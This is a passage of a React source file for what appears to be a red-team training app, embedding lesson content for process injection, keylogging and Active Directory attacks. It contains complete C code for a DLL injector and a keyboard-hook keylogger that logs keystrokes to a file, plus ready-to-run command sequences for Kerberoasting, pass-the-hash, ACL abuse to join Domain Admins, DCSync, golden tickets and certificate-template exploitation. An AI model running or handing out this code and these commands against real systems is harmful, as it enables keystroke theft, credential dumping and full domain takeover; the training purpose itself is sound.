    
    if (!hProc) {
        printf("[!] OpenProcess failed: %lu\\n", 
            GetLastError());
        return FALSE;
    }
    
    size_t len = strlen(dllPath) + 1;
    
    printf("[*] Allocating memory...\\n");
    LPVOID mem = VirtualAllocEx(hProc, NULL, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!mem) {
        printf("[!] VirtualAllocEx failed\\n");
        CloseHandle(hProc);
        return FALSE;
    }
    
    printf("[*] Writing DLL path...\\n");
    if (!WriteProcessMemory(hProc, mem, 
        dllPath, len, NULL)) {
        printf("[!] WriteProcessMemory failed\\n");
        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    printf("[*] Creating remote thread...\\n");
    HANDLE hThread = CreateRemoteThread(hProc,
        NULL, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA,
        mem, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        printf("[+] Injection successful!\\n");
    }
    
    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return hThread != NULL;
}

int main(int argc, char* argv[]) {
    printf("=== DLL Injector ===\\n\\n");
    
    DWORD pid = FindProcess(L"notepad.exe");
    if (pid == 0) {
        printf("Target not found\\n");
        return 1;
    }
    
    printf("[*] Found target: PID %lu\\n", pid);
    Inject(pid, "C:\\\\path\\\\to\\\\your.dll");
    
    return 0;
}`,
            language: "c"
          },
          warning: `Only use on systems you own. Injection into other processes may trigger security alerts.`
        },
        {
          title: "Lab 3: Simple Keylogger",
          content: `Learn how input monitoring works by building a basic keylogger. This demonstrates Windows hooks.

**Concepts:**
• SetWindowsHookEx for keyboard hooks
• Message loops
• Low-level input handling`,
          tip: `This is for educational purposes. Real keyloggers are illegal without consent!`,
          example: {
            title: "Keyboard Hook Example",
            code: `#include <windows.h>
#include <stdio.h>

HHOOK hHook;
FILE* logFile;

LRESULT CALLBACK KeyboardProc(
    int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        char key = MapVirtualKey(kb->vkCode, 
            MAPVK_VK_TO_CHAR);
        
        if (key >= 32 && key <= 126) {
            printf("%c", key);
            if (logFile) {
                fprintf(logFile, "%c", key);
                fflush(logFile);
            }
        }
    }
    
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    printf("[*] Keyboard monitor started\\n");
    printf("[*] Press Ctrl+C to stop\\n\\n");
    
    logFile = fopen("keys.txt", "a");
    
    hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        GetModuleHandle(NULL),
        0
    );
    
    if (!hHook) {
        printf("Hook failed: %lu\\n", GetLastError());
        return 1;
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(hHook);
    if (logFile) fclose(logFile);
    
    return 0;
}`,
            language: "c"
          }
        }
      ]
    },
    "active-directory": {
      title: "Active Directory Attacks",
      description: "Master AD enumeration, lateral movement, and domain dominance",
      sections: [
        {
          type: "intro",
          content: `Active Directory (AD) is the backbone of most enterprise networks. Understanding how to enumerate, attack, and pivot through AD environments is essential for red team operations. This module covers everything from initial reconnaissance to complete domain compromise.`
        },
        {
          title: "Understanding Active Directory",
          content: `Active Directory is Microsoft's directory service for Windows domain networks. It stores information about network resources and makes them accessible to users and applications.

**Key Components:**
• **Domain Controller (DC)**: Server that handles authentication and authorization
• **Domain**: A logical group of network objects (users, computers, groups)
• **Forest**: Collection of one or more domains that share a common schema
• **Organizational Unit (OU)**: Container for organizing objects within a domain`,
          concepts: [
            { label: "LDAP", explanation: "Lightweight Directory Access Protocol - used to query AD" },
            { label: "Kerberos", explanation: "Authentication protocol used by AD" },
            { label: "NTLM", explanation: "Legacy authentication protocol, still widely used" },
            { label: "SPN", explanation: "Service Principal Name - identifies service accounts" }
          ],
          tip: `Always start with enumeration! Understanding the AD structure before attacking gives you a roadmap for compromise.`
        },
        {
          title: "Domain Enumeration",
          content: `Before attacking, you need to understand the target environment. Enumeration reveals users, groups, computers, and trust relationships.

**Key enumeration targets:**
• Domain Admins and Enterprise Admins groups
• Service accounts (often have weak passwords)
• Computers with unconstrained delegation
• Group Policy Objects (GPOs)
• Trust relationships between domains`,
          example: {
            title: "PowerView Enumeration",
            description: "Common PowerView commands for AD enumeration:",
            code: `# Import PowerView
Import-Module .\\PowerView.ps1

# Get current domain info
Get-Domain

# Get all domain controllers
Get-DomainController

# Get all domain users
Get-DomainUser | Select-Object samaccountname,description

# Find Domain Admins
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Find users with SPNs (Kerberoastable)
Get-DomainUser -SPN

# Find all Group Policy Objects
Get-DomainGPO | Select-Object displayname,gpcfilesyspath

# Find shares
Find-DomainShare -CheckShareAccess`,
            language: "powershell"
          }
        },
        {
          title: "Kerberos Attacks",
          content: `Kerberos is AD's primary authentication protocol. Understanding its weaknesses is crucial for privilege escalation.

**AS-REP Roasting:**
Target accounts without Kerberos pre-authentication. You can request their AS-REP and crack it offline.

**Kerberoasting:**
Request TGS tickets for service accounts and crack them offline. Service account passwords are often weak.`,
          warning: `These attacks generate network traffic that can be detected. Use them sparingly and at appropriate times.`,
          example: {
            title: "Kerberos Attack Commands",
            code: `# ASREPRoasting with Rubeus
.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# With Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Kerberoasting with Rubeus  
.\\Rubeus.exe kerberoast /outfile:tgs.txt

# With Impacket
GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user:password

# Crack with hashcat
hashcat -m 18200 asrep.txt wordlist.txt  # AS-REP
hashcat -m 13100 tgs.txt wordlist.txt    # TGS`,
            language: "powershell"
          }
        },
        {
          title: "Lateral Movement",
          content: `Once you have credentials, you need to move through the network to reach high-value targets.

**Pass-the-Hash (PtH):**
Use NTLM hash to authenticate without knowing the password.

**Pass-the-Ticket (PtT):**
Use stolen Kerberos tickets for authentication.

**Overpass-the-Hash:**
Convert NTLM hash to Kerberos ticket (best of both worlds).`,
          concepts: [
            { label: "NTLM Hash", explanation: "MD4 hash of user's password, sufficient for authentication" },
            { label: "TGT", explanation: "Ticket Granting Ticket - proves identity to KDC" },
            { label: "TGS", explanation: "Ticket Granting Service - grants access to specific services" },
            { label: "Rubeus", explanation: "C# toolset for Kerberos interaction" }
          ],
          example: {
            title: "Lateral Movement Commands",
            code: `# Pass-the-Hash with mimikatz
sekurlsa::pth /user:admin /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee

# Pass-the-Hash with Impacket
psexec.py -hashes :aad3b435b51404ee corp.local/admin@10.10.10.5

# Pass-the-Ticket
.\\Rubeus.exe ptt /ticket:base64_ticket

# Overpass-the-Hash
.\\Rubeus.exe asktgt /user:admin /rc4:ntlm_hash /ptt

# Remote execution with WMI
wmiexec.py -hashes :ntlm_hash domain/user@target

# PowerShell Remoting
Enter-PSSession -ComputerName DC01 -Credential $cred`,
            language: "powershell"
          }
        },
        {
          title: "Privilege Escalation via ACLs",
          content: `Active Directory Access Control Lists (ACLs) define permissions on AD objects. Misconfigurations can be exploited for privilege escalation.

**Dangerous Permissions:**
• **GenericAll**: Full control - can reset passwords, add to groups
• **GenericWrite**: Modify attributes - can set SPN for Kerberoasting
• **WriteDACL**: Modify permissions - grant yourself more access
• **WriteOwner**: Take ownership - then modify permissions`,
          tip: `BloodHound is essential for visualizing attack paths through ACL abuse. Always run it first!`,
          example: {
            title: "ACL Abuse Examples",
            code: `# Find users with GenericAll on Domain Admins
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
    ? {$_.ActiveDirectoryRights -match "GenericAll"} |
    Select-Object SecurityIdentifier

# If you have GenericAll - reset password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)

# If you have GenericAll - add to group
Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"

# If you have GenericWrite - set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

# Then Kerberoast the account
.\\Rubeus.exe kerberoast /user:targetuser`,
            language: "powershell"
          }
        },
        {
          title: "Domain Dominance",
          content: `Once you have Domain Admin, these techniques provide persistent access and allow extracting all credentials.

**DCSync:**
Replicate domain controller data to extract all password hashes.

**Golden Ticket:**
Forge TGT with KRBTGT hash - unlimited access for 10 years.

**Silver Ticket:**
Forge TGS for specific services - more stealthy than Golden Ticket.`,
          warning: `These techniques leave artifacts. DCSync generates replication traffic. Golden Tickets require the KRBTGT hash which means you've already compromised a DC.`,
          example: {
            title: "Domain Dominance Attacks",
            code: `# DCSync - extract all hashes
mimikatz # lsadump::dcsync /domain:corp.local /all

# DCSync - extract specific user (like krbtgt)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# With Impacket
secretsdump.py -just-dc corp.local/admin:password@DC01

# Golden Ticket
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# With Rubeus
.\\Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /rc4:krbtgt_hash /ptt

# Silver Ticket (for CIFS/file shares)
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:machine_hash /ptt`,
            language: "powershell"
          }
        },
        {
          title: "AD Certificate Services (ADCS) Attacks",
          content: `ADCS is frequently misconfigured, providing paths to domain compromise.

**ESC1**: Certificate templates allowing requesters to specify SAN
**ESC2**: Templates with Any Purpose EKU
**ESC3**: Certificate Request Agent templates
**ESC4**: Vulnerable certificate template ACLs
**ESC8**: Web enrollment NTLM relay`,
          example: {
            title: "ADCS Enumeration and Exploitation",
            code: `# Enumerate vulnerable templates with Certify
.\\Certify.exe find /vulnerable

# ESC1 - Request cert with admin SAN
.\\Certify.exe request /ca:CA01.corp.local\\corp-CA /template:VulnTemplate /altname:administrator

# Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Use cert for authentication
.\\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt

# With Certipy (Python)
certipy find -u user@corp.local -p password -dc-ip 10.10.10.1
certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template VulnTemplate -upn administrator@corp.local`,
            language: "powershell"
          }
        }
      ]
    }
  };

  const currentLesson = lessons[moduleId];

  if (!currentLesson) {
    return (
      <Card className="p-8 bg-card border-border/50 backdrop-blur">
        <div className="text-center space-y-4">
          <BookOpen className="h-16 w-16 text-muted-foreground/50 mx-auto" />
          <p className="text-lg text-muted-foreground">Select a module to start learning</p>
          <p className="text-sm text-muted-foreground/70">Each module has clear explanations, examples, and practice code</p>
        </div>
      </Card>
    );
  }

  return (
    <Card className="h-[600px] flex flex-col bg-card border-border shadow-lg">
      {/* Header */}
      <div className="p-4 border-b border-border/50 bg-gradient-to-r from-primary/10 to-transparent">
        <div className="flex items-center gap-3">
          <div className="p-2 rounded-lg bg-primary/20">
            <BookOpen className="h-5 w-5 text-primary" />
          </div>
          <div className="flex-1">
            <h3 className="font-semibold text-foreground">{currentLesson.title}</h3>
            {currentLesson.description && (
              <p className="text-xs text-muted-foreground mt-1">{currentLesson.description}</p>
            )}
          </div>
        </div>
      </div>
      
      {/* Content */}
      <ScrollArea className="flex-1 p-6">
        <div className="space-y-8 max-w-4xl">
          {currentLesson.sections.map((section: any, idx: number) => (
            <div key={idx} className="space-y-4">
              {/* Intro Section */}
              {section.type === "intro" && (
                <div className="p-4 rounded-lg bg-primary/10 border-l-4 border-primary">
                  <p className="text-sm text-foreground leading-relaxed">{section.content}</p>
                </div>
              )}

              {/* Regular Section */}
              {!section.type && (
                <>
                  {/* Section Title */}
                  {section.title && (
                    <div className="flex items-start gap-3">
                      <div className="mt-1 w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center text-sm font-bold text-primary shrink-0">
                        {idx}
                      </div>
                      <h4 className="text-xl font-bold text-foreground">{section.title}</h4>
                    </div>
                  )}

                  {/* Main Content */}
                  {section.content && (
                    <div className="ml-11 space-y-3">
                      <div className="prose prose-sm max-w-none">
                        <p className="text-sm text-foreground/90 leading-relaxed whitespace-pre-line">
                          {section.content}
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Key Concepts Box */}
                  {section.concepts && section.concepts.length > 0 && (
                    <div className="ml-11 p-4 rounded-lg bg-concept-bg border border-concept-border">
                      <div className="flex items-center gap-2 mb-3">
                        <Sparkles className="h-4 w-4 text-concept-border" />
                        <h5 className="font-semibold text-concept-text text-sm">KEY CONCEPTS</h5>
                      </div>
                      <div className="space-y-2">
                        {section.concepts.map((concept: any, i: number) => (
                          <div key={i} className="flex gap-3">
                            <code className="text-xs font-mono text-concept-border bg-concept-bg/50 px-2 py-1 rounded shrink-0">
                              {concept.label}
                            </code>
                            <p className="text-xs text-concept-text/90 leading-relaxed">
                              {concept.explanation}
                            </p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Tip Box */}
                  {section.tip && (
                    <div className="ml-11 p-4 rounded-lg bg-tip-bg border border-tip-border">
                      <div className="flex items-start gap-2">
                        <Lightbulb className="h-4 w-4 text-tip-border shrink-0 mt-0.5" />
                        <div>
                          <h5 className="font-semibold text-tip-text text-sm mb-1">💡 PRO TIP</h5>
                          <p className="text-xs text-tip-text/90 leading-relaxed">{section.tip}</p>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Warning Box */}
                  {section.warning && (
                    <div className="ml-11 p-4 rounded-lg bg-warning-bg border border-warning-border">
                      <div className="flex items-start gap-2">
                        <AlertTriangle className="h-4 w-4 text-warning-border shrink-0 mt-0.5" />
                        <div>
                          <h5 className="font-semibold text-warning-text text-sm mb-1">⚠️ IMPORTANT</h5>
                          <p className="text-xs text-warning-text/90 leading-relaxed">{section.warning}</p>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Example Box */}
                  {section.example && (
                    <div className="ml-11 space-y-3">
                      <div className="p-4 rounded-t-lg bg-example-bg border border-example-border border-b-0">
                        <div className="flex items-center gap-2 mb-2">
                          <Code className="h-4 w-4 text-example-border" />
                          <h5 className="font-semibold text-example-text text-sm">{section.example.title}</h5>
                        </div>
                        {section.example.description && (
                          <p className="text-xs text-example-text/80 leading-relaxed">
                            {section.example.description}
                          </p>
                        )}
                      </div>
                      <div className="relative">
                        <div className="absolute top-3 right-3 z-10">
                          <Badge variant="secondary" className="text-xs font-mono bg-background/80 backdrop-blur">
                            {section.example.language || "c"}
                          </Badge>
                        </div>
                        <pre className="bg-code-bg p-5 rounded-b-lg overflow-x-auto text-xs border border-example-border border-t-0">
                          <code className="text-foreground/90 font-mono whitespace-pre leading-relaxed">
                            {section.example.code}
                          </code>
                        </pre>
                      </div>
                    </div>
                  )}

                  {/* Regular Code Block (without example wrapper) */}
                  {section.code && !section.example && (
                    <div className="ml-11 relative">
                      <div className="absolute top-3 right-3 z-10">
                        <Badge variant="secondary" className="text-xs font-mono bg-background/80 backdrop-blur">
                          {section.language || "c"}
                        </Badge>
                      </div>
                      <pre className="bg-code-bg p-5 rounded-lg overflow-x-auto text-xs border border-border/50">
                        <code className="text-foreground/90 font-mono whitespace-pre leading-relaxed">
                          {section.code}
                        </code>
                      </pre>
                    </div>
                  )}
                </>
              )}
            </div>
          ))}

          {/* Progress Indicator */}
          <div className="flex items-center justify-center gap-2 pt-4 border-t border-border/30">
            <CheckCircle2 className="h-4 w-4 text-success" />
            <p className="text-xs text-muted-foreground">
              You've completed this section! Try the code examples in the editor →
            </p>
          </div>
        </div>
      </ScrollArea>
    </Card>
  );
};

export default LessonViewer;
